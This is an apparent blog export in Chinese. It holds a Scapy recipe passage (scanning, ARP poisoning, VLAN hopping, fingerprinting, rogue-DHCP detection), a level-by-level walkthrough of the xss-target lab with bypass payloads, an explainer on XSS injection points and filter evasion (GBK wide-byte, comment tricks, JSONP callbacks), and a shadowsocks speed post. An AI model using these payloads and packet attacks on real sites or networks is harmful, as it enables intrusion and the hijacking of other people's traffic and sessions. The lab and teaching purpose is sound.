123&gt;&gt;&gt; send( Ether(dst=clientMAC)/Dot1Q(vlan=1)/Dot1Q(vlan=2) /ARP(op=&quot;who-has&quot;, psrc=gateway, pdst=client), inter=RandNum(10,40), loop=1 ) TCP Port Scanning发送一个TCP SYN到每一个端口上。等待一个SYN-ACK或者是RST或者是一个ICMP错误： 12&gt;&gt;&gt; res,unans = sr( IP(dst=&quot;target&quot;) /TCP(flags=&quot;S&quot;, dport=(1,1024)) ) 将开放的端口结果可视化： &gt;&gt;&gt; res.nsummary( lfilter=lambda (s,r): (r.haslayer(TCP) and (r.getlayer(TCP).flags &amp; 2)) )IKE Scanning我们试图通过发送ISAKMP Security Association proposals来确定VPN集中器，并接收应答： 1234&gt;&gt;&gt; res,unans = sr( IP(dst=&quot;192.168.1.*&quot;)/UDP() /ISAKMP(init_cookie=RandString(8), exch_type=&quot;identity prot.&quot;) /ISAKMP_payload_SA(prop=ISAKMP_payload_Proposal()) ) 可视化结果列表： &gt;&gt;&gt; res.nsummary(prn=lambda (s,r): r.src, lfilter=lambda (s,r): r.haslayer(ISAKMP) )Advanced tracerouteTCP SYN traceroute&gt;&gt;&gt; ans,unans=sr(IP(dst=&quot;4.2.2.1&quot;,ttl=(1,10))/TCP(dport=53,flags=&quot;S&quot;))结果会是： &gt;&gt;&gt; ans.summary( lambda(s,r) : r.sprintf(&quot;%IP.src%\t{ICMP:%ICMP.type%}\t{TCP:%TCP.flags%}&quot;)) 192.168.1.1 time-exceeded 68.86.90.162 time-exceeded 4.79.43.134 time-exceeded 4.79.43.133 time-exceeded 4.68.18.126 time-exceeded 4.68.123.38 time-exceeded 4.2.2.1 SAUDP traceroute相比较TCP来说， traceroute一个UDP应用程序是不可靠的，因为ta没有握手的过程。我们需要给一个应用性的有效载荷（DNS，ISAKMP，NTP等）来得到一个应答： &gt;&gt;&gt; res,unans = sr(IP(dst=&quot;target&quot;, ttl=(1,20))/UDP()/DNS(qd=DNSQR(qname=&quot;test.com&quot;))我们可以想象得到一个路由器列表的结果： &gt;&gt;&gt; res.make_table(lambda (s,r): (s.dst, s.ttl, r.src))DNS traceroute我们可以在traceroute()函数中设置l4参数为一个完整的数据包，来实现DNS traceroute： &gt;&gt;&gt; ans,unans=traceroute(&quot;4.2.2.1&quot;,l4=UDP(sport=RandShort())/DNS(qd=DNSQR(qname=&quot;thesprawl.org&quot;))) Begin emission: ..*....******...******.***...****Finished to send 30 packets. *****...***............................... Received 75 packets, got 28 answers, remaining 2 packets 4.2.2.1:udp53 1 192.168.1.1 11 4 68.86.90.162 11 5 4.79.43.134 11 6 4.79.43.133 11 7 4.68.18.62 11 8 4.68.123.6 11 9 4.2.2.1 ...Etherleaking&gt;&gt;&gt; sr1(IP(dst=&quot;172.16.1.232&quot;)/ICMP()) &lt;IP src=172.16.1.232 proto=1 [...] |&lt;ICMP code=0 type=0 [...]| &lt;Padding load=’0O\x02\x01\x00\x04\x06public\xa2B\x02\x02\x1e’ |&gt;&gt;&gt;ICMP leaking这是一个Linux2.0的一个bug： &gt;&gt;&gt; sr1(IP(dst=&quot;172.16.1.1&quot;, options=&quot;\x02&quot;)/ICMP()) &lt;IP src=172.16.1.1 [...] |&lt;ICMP code=0 type=12 [...] | &lt;IPerror src=172.16.1.24 options=’\x02\x00\x00\x00’ [...] | &lt;ICMPerror code=0 type=8 id=0x0 seq=0x0 chksum=0xf7ff | &lt;Padding load=’\x00[...]\x00\x1d.\x00V\x1f\xaf\xd9\xd4;\xca’ |&gt;&gt;&gt;&gt;&gt;VLAN hopping在非常特殊的情况下，使用double 802.1q封装，可以将一个数据包跳到另一个VLAN中： &gt;&gt;&gt; sendp(Ether()/Dot1Q(vlan=2)/Dot1Q(vlan=7)/IP(dst=target)/ICMP())Wireless sniffing以下的命令将会像大多数的无线嗅探器那样显示信息： &gt;&gt;&gt; sniff(iface=&quot;ath0&quot;,prn=lambda x:x.sprintf(&quot;{Dot11Beacon:%Dot11.addr3%\t%Dot11Beacon.info%\t%PrismHeader.channel%\tDot11Beacon.cap%}&quot;))以上命令会产生类似如下的输出： 00:00:00:01:02:03 netgear 6L ESS+privacy+PBCC 11:22:33:44:55:66 wireless_100 6L short-slot+ESS+privacy 44:55:66:00:11:22 linksys 6L short-slot+ESS+privacy 12:34:56:78:90:12 NETGEAR 6L short-slot+ESS+privacy+short-preamble0x03 RecipesSimplistic ARP Monitor以下的程序使用了sniff()函数的回调功能（prn参数）。将store参数设置为0，就可以使sniff()函数不存储任何数据（否则会存储），所以就可以一直嗅探下去。filter参数则用于在高负荷的情况下有更好的性能：filter会在内核中应用，而且Scapy就只能嗅探到ARP流量。 12345678#! /usr/bin/env pythonfrom scapy.all import *def arp_monitor_callback(pkt): if ARP in pkt and pkt[ARP].op in (1,2): #who-has or is-at return pkt.sprintf("%ARP.hwsrc% %ARP.psrc%")sniff(prn=arp_monitor_callback, filter="arp", store=0) Identifying rogue DHCP servers on your LANProblem你怀疑有人已经在你的LAN中安装了额外的未经授权的DHCP服务器-无论是故意的还是有意的。因此你想要检查是否有任何活动的DHCP服务器，并确定他们的IP和MAC地址。 Solution使用Scapy发送一个DHCP发现请求，并分析应答： &gt;&gt;&gt; conf.checkIPaddr = False &gt;&gt;&gt; fam,hw = get_if_raw_hwaddr(conf.iface) &gt;&gt;&gt; dhcp_discover = Ether(dst=&quot;ff:ff:ff:ff:ff:ff&quot;)/IP(src=&quot;0.0.0.0&quot;,dst=&quot;255.255.255.255&quot;)/UDP(sport=68,dport=67)/BOOTP(chaddr=hw)/DHCP(options=[(&quot;message-type&quot;,&quot;discover&quot;),&quot;end&quot;]) &gt;&gt;&gt; ans, unans = srp(dhcp_discover, multi=True) # Press CTRL-C after several seconds Begin emission: Finished to send 1 packets. .*...*.. Received 8 packets, got 2 answers, remaining 0 packets在这种情况下，我们得到了两个应答，所以测试网络上有两个活动的DHCP服务器： &gt;&gt;&gt; ans.summarize() Ether / IP / UDP 0.0.0.0:bootpc &gt; 255.255.255.255:bootps / BOOTP / DHCP ==&gt; Ether / IP / UDP 192.168.1.1:bootps &gt; 255.255.255.255:bootpc / BOOTP / DHCP Ether / IP / UDP 0.0.0.0:bootpc &gt; 255.255.255.255:bootps / BOOTP / DHCP ==&gt; Ether / IP / UDP 192.168.1.11:bootps &gt; 255.255.255.255:bootpc / BOOTP / DHCP }}} We are only interested in the MAC and IP addresses of the replies: {{{ &gt;&gt;&gt; for p in ans: print p[1][Ether].src, p[1][IP].src ... 00:de:ad:be:ef:00 192.168.1.1 00:11:11:22:22:33 192.168.1.11Discussion我们设置multi=True来确保Scapy在接收到第一个响应之后可以等待更多的应答数据包。这也就是我们为什么不用更方便的dhcp_request()函数，而是手动地构造DCHP数据包的原因：dhcp_request()使用srp1()来发送和接收数据包，这样在接收到一个应答数据包之后就会立即返回。 此外，Scapy通常确保应答来源于之前发送请求的目的地址。但是我们的DHCP数据包被发送到IP广播地址（255.255.255.255），任何应答数据包都将回复DCHP服务器的IP地址作为其源IP地址（e.g. 192.168.1.1）。由于这些IP地址不匹配，我们必须在发送请求前使用conf.checkIPaddr = False来禁用Scapy的check。 See also FirewalkingTTL减一操作过滤后，只有没被过滤的数据包会产生一个ICMP TTL超时 1234&gt;&gt;&gt; ans, unans = sr(IP(dst=&quot;172.16.4.27&quot;, ttl=16)/TCP(dport=(1,1024)))&gt;&gt;&gt; for s,r in ans: if r.haslayer(ICMP) and r.payload.type == 11: print s.dport 在对多网卡的防火墙查找子网时，只有它自己的网卡IP可以达到这个TTL： &gt;&gt;&gt; ans, unans = sr(IP(dst=&quot;172.16.5/24&quot;, ttl=15)/TCP()) &gt;&gt;&gt; for i in unans: print i.dstTCP Timestamp FilteringProblem在比较流行的端口扫描器中，一种常见的情况就是没有设置TCP时间戳选项，而许多防火墙都包含一条规则来丢弃这样的TCP数据包。 Solution为了让Scapy能够到达其他位置，就必须使用其他选项： &gt;&gt;&gt; sr1(IP(dst=&quot;72.14.207.99&quot;)/TCP(dport=80,flags=&quot;S&quot;,options=[(&apos;Timestamp&apos;,(0,0))]))Viewing packets with WiresharkProblem你已经使用Scapy收集或者嗅探了一些数据包，因为Wireshark高级的数据包展示功能，你想使用Wireshark查看这些数据包。 Solution正好可以使用wireshark()函数： &gt;&gt;&gt; packets = Ether()/IP(dst=Net(&quot;google.com/30&quot;))/ICMP() # first generate some packets &gt;&gt;&gt; wireshark(packets) # show them with WiresharkDiscussionwireshark()函数可以生成一个临时pcap文件，来包含你的数据包，然后会在后台启动Wireshark，使其在启动时读取该文件。 请记住Wireshark是处理第二层的数据包（通常被称为“帧”）。所以我们必须为ICMP数据包添加一个Ether()头。如果你直接将IP数据包（第三层）传递给Wireshark，你将会得到一个奇怪的结果。 你可以通过改变conf.prog.wireshark的配置设置，来告诉Scapy去哪寻找Wireshark可执行文件。 OS FingerprintingISNScapy的可用于分析ISN（初始序列号）递增来发现可能有漏洞的系统。首先我们将在一个循环中发送SYN探头，来收集目标响应： &gt;&gt;&gt; ans,unans=srloop(IP(dst=&quot;192.168.1.1&quot;)/TCP(dport=80,flags=&quot;S&quot;))一旦我们得到响应之后，我们可以像这样开始分析收集到的数据： &gt;&gt;&gt; temp = 0 &gt;&gt;&gt; for s,r in ans: ... temp = r[TCP].seq - temp ... print str(r[TCP].seq) + &quot;\t+&quot; + str(temp) ... 4278709328 +4275758673 4279655607 +3896934 4280642461 +4276745527 4281648240 +4902713 4282645099 +4277742386 4283643696 +5901310nmap_fp在Scapy中支持Nmap指纹识别（是到Nmap v4.20的“第一代”功能）。在Scapy v2中，你首先得加载扩展模块： &gt;&gt;&gt; load_module(&quot;nmap&quot;)如果你已经安装了Nmap，你可以让Scapy使用它的主动操作系统指纹数据库。清确保version 1签名数据库位于指定的路径： &gt;&gt;&gt; conf.nmap_base然后你可以使用namp_fp()函数，该函数和Nmap操作系统检测引擎使用同样的探针： &gt;&gt;&gt; nmap_fp(&quot;192.168.1.1&quot;,oport=443,cport=1) Begin emission: .****..**Finished to send 8 packets. *................................................ Received 58 packets, got 7 answers, remaining 1 packets (1.0, [&apos;Linux 2.4.0 - 2.5.20&apos;, &apos;Linux 2.4.19 w/grsecurity patch&apos;, &apos;Linux 2.4.20 - 2.4.22 w/grsecurity.org patch&apos;, &apos;Linux 2.4.22-ck2 (x86) w/grsecurity.org and HZ=1000 patches&apos;, &apos;Linux 2.4.7 - 2.6.11&apos;])p0f如果你已在操作系统中安装了p0f，你可以直接从Scapy中使用它来猜测操作系统名称和版本。（仅在SYN数据库被使用时）。首先要确保p0f数据库存在于指定的路径： &gt;&gt;&gt; conf.p0f_base例如，根据一个捕获的数据包猜测操作系统： &gt;&gt;&gt; sniff(prn=prnp0f) 192.168.1.100:54716 - Linux 2.6 (newer, 1) (up: 24 hrs) -&gt; 74.125.19.104:www (distance 0) &lt;Sniffed: TCP:339 UDP:2 ICMP:0 Other:156&gt;]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>Scapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tips of xss-target]]></title>
    <url>%2F2016%2F12%2F17%2FTips-of-xss-target%2F</url>
    <content type="text"><![CDATA[xss-target是我从github上找到的一个开源项目，只可惜没提供解题思路，在此奉上自己做题时的一些解法，供大家参考。大家在做的时候建议用firefox浏览器，毕竟大多数是反射型xss，使用其他浏览器会受其xss filter的影响。xss-target传送门 level1 常规做法，反射点为body标签，直接上payload：&lt;script&gt;alert(1)&lt;/script&gt; level2 查看页面源码，可以看到反射点在&lt;input name=keyword value=&quot;&quot;&gt;里的value中，可以选择闭合双引号payload：&quot; onclick=&quot;alert(1) 其实level2本意是想让你新创建&lt;script&gt;标签，即payload为：&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt; ， 但只要达到同样效果便可。 level3 这次的反射点依旧是在&lt;input name=&quot;keyword&quot; value=&gt;里的value中，但是这是过滤了双引号，应该是经过了htmlspecialchars并且仅过滤了双引号，因为当你把payload写成&#39;onclick=&#39;alert(1)时就可以绕过。 level4 与level2的payload相同：&quot;onclick=&quot;alert(1) level5 这一关基本上就没法用事件触发了，因为你会发现所有的on字段都被转换成o_n，但是双引号还是可以闭合的，因此，可以尝试闭合标签并新建一个&lt;a&gt;标签，href用js伪协议。 payload：&quot;&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;haha level6 基本上从这一关开始，每一题的payload都不同于前面几关，这一关里，后端将on src href script全都转换成其他的了，乍一看有些不知所措 ：p ，但是这里还是可以闭合标签的。实际上，html对标签规范书写的要求很低，标签名可以大小写参杂。因此，payload可以是：&quot;&gt;&lt;ScriPt&gt;alert(1)&lt;/scRipt&gt;&quot; level7 by the way，每一关都是建立在上一关的过滤基础上进行过滤的，这一次大小写参杂不起作用，应该是后端将输入的字符县转换成小写的，按照level6的payload提交后，你会在反射点处发现&lt;ScriPt&gt;变成了&lt;&gt;，那么可以尝试一个经典的绕过payload：&quot;&gt;scriscriptpt&gt;alert(1)&lt;/scriscriptpt&gt;&quot; level8 不得不说，这一关有一点狗血…题意一目了然，就是将你的输入反射到“友情链接”的href值里去，一开始你会想必然得用js伪协议啊-。- 想法很对，但不久你也会发现，后端将包含script的字段替换成scr_ipt，那就还是看你怎么绕了～同样，html对标签规范书写的低要求，让你可以在&lt;script&gt;中参杂着\t \n等，这些都不影响浏览器的解析。因此，payload可以是：java script:alert(1)（其中a与s用\t间隔） level9 这里同样是添加友情链接，但是用level8的payload后端会提示链接不合法，试了很多字符段后发现，你的输入必须有http://而不管其出现在什么位置，就会被认为是合法链接，因此，payload可以是：javascr ipt:alert(1)//http://像这样将http://注释掉即可。 level10 这一关主要是找对反射点，正确的反射点应该是在&lt;input name=&quot;t_sort&quot; value= type=&quot;hidden&quot;&gt;中的value值里，注意到这里的input是hidden类型，payload里需要将type改成其他类型：&quot; type=&quot;text&quot; onclick=&quot;alert(1) level11 在这一关里，足够细心才有可能找到反射点。对了，就是在t_ref里，这里存放的是$_SERVER[&#39;HTTP_REFERER&#39;]的值，如果是从level10跳转来的并且使用的是FF/GG浏览器，那么你会发现在t_ref中是已经经过encode的referer了。但IE下不会（测试的是IE8），因此，可以这样做： level12 与level11相似，这次反射点是在t_ua的value里，因此，得想办法修改默认的User-Agent。firefox里就有很多修改ua的插件，例如：payload：&quot;type=text onclick=&quot;alert(1) level13 同样，这次是在cookie中，推荐一个插件：tamper data payload同上 level14 这一关有些问题，直接看level15吧。 level15 还是找反射点，查看页面源码可以发现： 页面导入了angularjs； 反射点是在class=&quot;ng-include: &#39;src&#39;&quot;； 可控参数实际上是$_GET[&#39;src&#39;]。 angularjs中的ng-include有如下用法： ng-include,如果单纯指定地址，必须要加引号 ng-include,加载外部html，script标签中的内容不执行，不能加载，如果需要控制器处理需要在主页中注册 ng-include,加载外部html中含有style标签样式可以识别 ng-inclue,记载外部html中的link标签可以加载 由此可见，我们可以构建一个页面 test.html，body下写一个&lt;img src=&quot;&quot; onerror=&quot;alert(1)&quot;&gt;，然后?src=&#39;test.html&#39;，成功执行 level16 先尝试一下，看看哪些字段被过滤：script（大小写过滤）、空格、/、\t，这些都被替换成了&amp;nbsp; 常见的bypass是不起效了，而且过滤了/，导致一些需要闭合的标签也没法用 可以尝试一些不需要闭合的标签，例如我们喜欢的img 可是空格和/都被过滤，img、src和onerror怎么间隔开呢？还是像以前一样，html标签内容支持以多个空格、换行符、缩进符进行间隔，换行符还没有过滤呢～ 构造payload：&lt;img%0asrc=&quot;&quot;%0aonerror=&quot;alert(1)&quot; level17/18 看源码发现，这两题是一样的。。。 payload：?arg01=a&amp;arg02=b onmouseover=alert(1)]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>xss那些事儿</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于xss漏洞点的挖掘]]></title>
    <url>%2F2016%2F11%2F26%2F%E5%85%B3%E4%BA%8Exss%E6%BC%8F%E6%B4%9E%E7%82%B9%E7%9A%84%E6%8C%96%E6%8E%98%2F</url>
    <content type="text"><![CDATA[0x00 引言&emsp;&emsp;这篇文章主要是简单介绍一些常见的XSS漏洞点，我也在本地搭建了一个XSS练习靶场（github上的一个项目，来源戳这），以供大家学习 : ) 0x01 XSS XSS(跨战脚本攻击)大体可分为 反射型XSS、存储型XSS以及DOM XSS，而XSS漏洞挖掘最重要的就是找到反射点。 前两种的漏洞基本上是需要通过与服务器的交互，exploiter(漏洞挖掘者)需要判断用户输入会在哪里输出(如果可以输出&lt;script&gt;标签，浏览器会对其进行解析进而执行其中的脚本)；而DOM XSS可认为完全是客户端的事，触发XSS靠的是浏览器解析DOM。 0x02 HTML 标签之间：&lt;div id=&quot;xss is here&quot;&gt;[输出]&lt;/div&gt;比如说第一关，后端的判断如下 而输出出现在下面标签中： &lt;title&gt;&lt;/title&gt; &lt;textarea&gt;&lt;/textarea&gt; &lt;xmp&gt;&lt;/xmp&gt; &lt;iframe&gt;&lt;/iframe&gt; &lt;noscript&gt;&lt;/noscript&gt; &lt;noframes&gt;&lt;/noframes&gt; &lt;plaintext&gt;&lt;/plaintext&gt; &emsp;例如，&lt;title&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/title&gt;不会弹出提示框。但是，payload也可以这样写&lt;/title&gt;&lt;script&gt;alert(1)&lt;/script&gt; 标签之内：&lt;input type=&quot;text&quot; value=&quot;[输出]&quot;/&gt;（payload可以考虑闭合引号，也可考虑闭合标签等,比如说google的xss-game第三关以及第三关） js代码：&lt;script&gt;var username=&quot;[输出]&quot;；……&lt;/script&gt; CSS代码：&lt;style&gt;button { border-radius:[输出]px }&lt;/style&gt; 0x03 字符集编码《web前端黑客技术揭秘》一书中提到 有些安全问题的罪魁祸首是字符集的使用（即字符集编码与解码）不正确导致的，字符集本身也有一些问题，比如，各种说不清道不明的原因导致字符集之间的交际分歧。 宽字节编码&emsp;例如在magic_quotes_gpc=On的情况下如何触发XSS？&lt;?php header(&quot;Content-Type: text/html;charset=GBK&quot;);?&gt; &lt;head&gt; &lt;title&gt;gb xss&lt;/title&gt; &lt;/head&gt; &lt;script&gt; a = &quot;&lt;?php echo $_GET[&apos;x&apos;]?&gt;&quot;; &lt;/script&gt; &emsp;&emsp;先会想到闭合双引号:&emsp;&emsp;gb.php?x=1&quot;;alert(1)//&emsp;&emsp;双引号会被转移成&quot;，导致闭合失败：&emsp;&emsp;a = &quot;1\&quot;;alert(1)//&quot;;这本书提供了一种思路： 这个网页头部响应指明了这是GBK编码，GBK编码第一字节（高字节）的范围是0x810xFE,第二字节（低字节）的范围是0x400x7E与0x80~0xFE，这样的十六进制表示。而\符号的十六进制表示为0x5C，正好在GBK的低字节中，如果之前有一个高字节，那么正好会被组成一个合法字符。 &emsp;&emsp;gb.php?x=1%81&quot;;alert(1)//&emsp;&emsp;双引号会继续被转移成&quot;，最终如下：&emsp;&emsp;a=&quot;1[0x81]\&quot;;alert(1)//&quot;; [0x81]\组成了一个合法字符，于是之后的双引号就会产生闭合，这样我们就成功触发了XSS。 UTF-7&emsp;&emsp;UTF-7编码问题主要出现在老版本的IE浏览器下，在IE6/7时代，如果没声明HTTP响应头字符集编码方式或者声明错误，同时，&lt;meta http-equiv&gt;未指定charset或指定错误，那么IE浏览器会判断相应内容中是否出现UTF-7编码的字符串，如果有，浏览器将解析该字符串。 0x04 绕过 HTML中&emsp;1.标签&emsp;&emsp;- 黑名单绕过（有些html过滤器是基于黑名单的）&emsp;&emsp;- 注释绕过（有些HTML Parser对于注释的判断）&emsp;&emsp;&emsp;&emsp;- 会去判断当前代码段是否存在于注释中，如果这些过滤器的判断方法为：&lt;!--.*--&gt;，那么注释可这么写：bbb&lt;!-- aaa&lt;!--aaa--&gt; ccc--&gt;bbb，这样，“ccc”代码就暴露出来可以执行了。（这地方还不是很懂判断细则是怎样的（尴尬…） ）&emsp;&emsp;&emsp;&emsp;- 不关心是否有注释。但由于注释优先级较高，可以这么写：&lt;!--&lt;a href=&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;test&lt;/a&gt; 扫描器忽略了HTML注释之后，会认为下面这一段是一个完整的HTML语句：&lt;a href=&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;&gt;test&lt;/a&gt; 那么下面这段就被认为是属性href的值：&quot;--&gt;&lt;img src=x onerror=alert(1)//&quot;，从而对这段代码放行。但实际上对于浏览器来说，&lt;!--&lt;a href=&quot;--&gt;是注释内容，&lt;img src=x onerror=alert(1)//&quot;&gt;则是一个完整的img标签，而onerror则成了一个独立的事件属性得以执行。&emsp;&emsp;&emsp;&emsp;- IE下： &lt;!--[if IE]&gt; 所有的IE可识别&lt;![endif]--&gt; &lt;!--[if IE 6] 仅IE6可识别&lt;![endif]--&gt; &lt;!--[if lt IE 6] IE6以及IE6以下版本可识别&lt;![endif]--&gt; &lt;!--[if gte IE 6] IE6以及IE6以上版本可识别&lt;![endif]--&gt; &emsp;&emsp;- 利用标签优先级的绕过，有些标签如&lt;textarea&gt;、&lt;title&gt;、&lt;style&gt;、&lt;script&gt;、&lt;xmp&gt;等具有非常高的优先级，使得其结束标签甚至可以直接中断其他标签的属性。 &emsp;&emsp;&emsp;&emsp;2.属性&emsp;&emsp;&emsp;&emsp;&emsp;- 标签和属性之间、属性名和等号之间、等号和属性值之间可以用空格、换行符、回车符或者tab，并且个数不受限制。&emsp;&emsp;&emsp;&emsp;&emsp;- 另外，还可以在属性值的头部和尾部（引号里面）插入系统控制字符，即ASCII值为1~32这32个控制字符，不同浏览器都有各自的处理方式，如下语句： &lt;a &amp;#8 href=&quot;&amp;#32ajvascript:alert(1)&quot;&gt;test&lt;/a&gt;是可以在IE、Firefox、Chrome下执行的，但语句：&lt;a &amp;#8 href=&quot;&amp;#32javascript:alert(1)&amp;#27&quot;&gt;test&lt;/a&gt;就仅可以在IE和Firefox下执行。 CSS&emsp;1. 资源类属性可嵌入xml、css、js等&emsp;2. @import&emsp;3. expression(IE独有的CSS属性，可结合UTF-7) JS&emsp;1.&emsp;JSON&emsp;&emsp;- 通过callback函数名的参数调用Object的形式&emsp;&emsp;&emsp;- 此时，如果数据提供方没有对callback函数名做安全过滤，并且页面本身也没有对HTTP响应头中的Content-Type做限制，那么我们便跨域直接对callback参数进行利用，如：get_json.php?id=123&amp;callback=&lt;script&gt;alert(1);&lt;/script&gt;&emsp;2.&emsp;js中eval可执行 oct、hex编码的字符串，不可执行 十进制（但是可通过String.fromCharCode(,,,)转换，js下三套编解码的函数： escape/unescape；encodeURI/decodeURI；encodeURIComponent/decodeURIComponent。 0x05 页脚 其实xss的挖掘点数不胜数，各大浏览器都会出现或多或少的安全问题，同时xss漏洞也逐渐引起高度的重视。《web前端黑客技术揭秘》里提到一点： 标准总是过于美好，但是每个浏览器在实施这些标准时不一定就能很好地实施，所以不要轻信它们不会出现BUG。 在这里也安利两个书中提到的网站：经典的混淆CheckList&emsp;和&emsp;在线fuzzing平台，在实践中检验：）]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>xss那些事儿</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用net-speeder实现对ss的优化]]></title>
    <url>%2F2016%2F10%2F22%2F%E5%88%A9%E7%94%A8net-speeder%E5%AE%9E%E7%8E%B0%E5%AF%B9ss%E7%9A%84%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[很多玩家 翻GFW 都是通过租一个海外vps，并在其上布置shadowsocks(后文用ss代之)服务端。 对于像我这样的普通玩家来说，从搬瓦工上租用一个最便宜的vps即可满足基本要求（使用ss进行网页浏览、搜索资料的速度还可以），但要想下载一些东西，（至少对于我的这台vps）速度着实不敢恭维-.-。前些天想下载一些东西，无奈下载速度只有十几KB/s，最终还下载失败 - -！就想去了解如何优化ss的上网速度（找到了net-speeder）。使用的具体步骤作者在github上说得比较详细，我也就不再赘述。下面简单阐述其中涉及到的一些原理。首先有必要了解一下ss的工作原理：ss是基于ssh创建的sock5协议工作的，由于GFW设置了许多过滤，数据包在进行ssh的client ——&gt;GFW——&gt; server过程中，虽然避免了gfw的关键词分析，但是ssh本身特征是明显的，GFW会通过分析连接的特征进行干扰，导致ssh存在被定向进行干扰的问题。ss的作者曾在github上分享了他的解决方案(一年前被和谐…)，简单理解：ss是将原来ssh创建的socks5协议拆成server端和client端…详细原理戳这儿 net-speeder:项目简介源码是c写的，没看懂= =！简单来讲，net-speeder就是通过翻倍发包来降低丢包率 这是我在vps上ping google.com -c 2的结果，连接还算稳定，发出去的两个包全收到了。想必有些同学已经发现这和ping局域网的广播ip一样(linux系统下)出现了DUP。But，DUP是个啥？？ 在《tcp/ip详解》里，提到过unix某些主机在ping广播地址时， 如果出现重复序列号的数据包就显示DUP！这意味着一个数据包已经在某处重复了。 下面是使用net-speeder后的效果图：这速度下载个小文件还是能够接受的～不过作者也提到了：对于不加速就可以跑满带宽的类型来讲（多线程下载），开启后反而由于多出来的无效流量，导致速度减半。所以对于多线程/高速链路，这个方案是不适合的。 第一次写博客，如有错误或表达不善的地方，还垦请大家不吝赐教。^_^]]></content>
      <categories>
        <category>proto</category>
      </categories>
      <tags>
        <tag>墙墙墙</tag>
      </tags>
  </entry>
</search>
